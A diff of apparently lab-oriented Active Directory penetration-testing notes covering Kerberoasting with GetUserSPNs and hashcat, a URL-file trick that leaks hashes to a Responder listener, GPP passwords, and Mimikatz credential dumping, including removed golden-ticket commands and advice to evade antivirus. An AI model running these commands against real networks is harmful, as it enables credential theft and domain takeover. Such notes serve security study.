@@ -340,9 +340,32 @@ I recommend using this script to build the AD environment. This ensures that the
 
     * Privilege Access Management (PAM)
 
+* Kerberoasting:
+
+  * Goal of [Kerberoasting](https://medium.com/@Shorty420/kerberoasting-9108477279cc) is to get TGS (Ticket Granting Service) and decrypt the server's account hash.
+
+  ```shell
+  sudo GetUserSPNs.py marvel.local/fcastle:Password1 -dc-ip 192.168.57.140 -request
+  #needs username, password from domain account and its ip
+  #this provides us the hash, can be cracked using hashcat
+
+  hashcat -m 13100 hash.txt rockyou.txt
+  #cracks the hash
+  ```
+
+  * Mitigations:
+
+    * Strong passwords
+
+    * Least privilege (service accounts should not be made domain admins)
+
 * Token impersonation:
 
-  * Tokens - temporary keys that allow access without using creds; can be either delegate (login, RDP) or impersonate (drive, script).
+  * Tokens - temporary keys that allow access without using creds
+
+  * Types:
+    * delegate (login, RDP)
+    * impersonate (drive, script).
 
   ```shell
   msfconsole
@@ -395,24 +418,19 @@ I recommend using this script to build the AD environment. This ensures that the
 
     * Local admin restriction
 
-* Kerberoasting:
-
-  * Goal of [Kerberoasting](https://medium.com/@Shorty420/kerberoasting-9108477279cc) is to get TGS (Ticket Granting Service) and decrypt the server's account hash.
-
-  ```shell
-  GetUserSPNs.py marvel.local/fcastle:Password1 -dc-ip 192.168.57.140 -request
-  #needs username, password from domain account and its ip
-  #this provides us the hash, can be cracked using hashcat
-
-  hashcat -m 13100 hash.txt rockyou.txt
-  #cracks the hash
+* URL File Attacks: 
+  - Save this file to share accessible by many user with the following filename "@something.url":
+  ```html
+  [InternetShortcut] 
+  URL=blah 
+  WorkingDirectory=blah      
+  IconFile=\\x.x.x.x\%USERNAME%.icon 
+  IconIndex=1
   ```
-
-  * Mitigations:
-
-    * Strong passwords
-
-    * Least privilege (service accounts should not be made domain admins)
+  - Use responder to catch the hashes:
+  ```shell
+  responder -I eth0 -v
+   ```
 
 * GPP (Group Policy Preferences):
 
@@ -443,32 +461,26 @@ I recommend using this script to build the AD environment. This ensures that the
   psexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100
   ```
 
-* [URL File Attacks](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#scf-and-url-file-attack-against-writeable-share)
+  - Or if we have credentials: use metasploit smb_enum_gpp module
 
 * Mimikatz:
 
+  - If there is a share connected to a machine, might be possible to view the password in clear text using this tool
+  - Can be easily picked up by antivirus, thus obfuscation is necessary or disable antivirus
+
   ```shell
-  #in victim machine
+  #in victim machine, open it with admin privileges from cmd
   mimikatz.exe
 
   privilege::debug
   
   sekurlsa::logonpasswords
   #dump passwords
-
-  lsadump::sam
-
-  lsadump::lsa /patch
-  #dump lsa
-
-  #for golden ticket attacks
-  lsadump::lsa /inject /name:krbtgt
-  #copy the SID and NTLM from output
-
-  kerberos::golden /User:fakeAdministrator /domain:marvel.local /sid:<SID> /krbtgt:<NTLM hash> /id:500 /ptt
-  #to generate golden ticket and use pass-the-ticket
-
-  misc::cmd
-  #gets command prompt
-  #as Admin
   ```
+
+## Additional Active Directory Attacks
+
+- ZeroLogon
+- PrintNightmare
+
+## Post-Domain Compromise Attack Strategy
